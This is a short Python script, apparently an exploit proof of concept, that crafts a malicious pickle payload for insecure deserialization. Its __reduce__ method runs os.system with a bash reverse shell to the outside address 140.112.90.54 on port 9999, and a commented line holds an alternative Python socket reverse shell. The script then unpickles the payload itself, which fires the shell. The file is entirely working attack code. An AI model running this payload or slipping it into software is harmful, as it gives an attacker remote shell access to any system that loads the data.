#!/usr/bin/env python
import pickle
import os
class shell(object):
    def __reduce__(self):
        a = """/bin/bash -c '/bin/bash -i >& /dev/tcp/140.112.90.54/9999 0>&1' """
        # a = """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""
        return (os.system, (a,))    

result = pickle.dumps(shell())
print(result)
# with open('ser_obj', 'wb') as file:
    # file.write(bytearray(result))

pickle.loads(result)
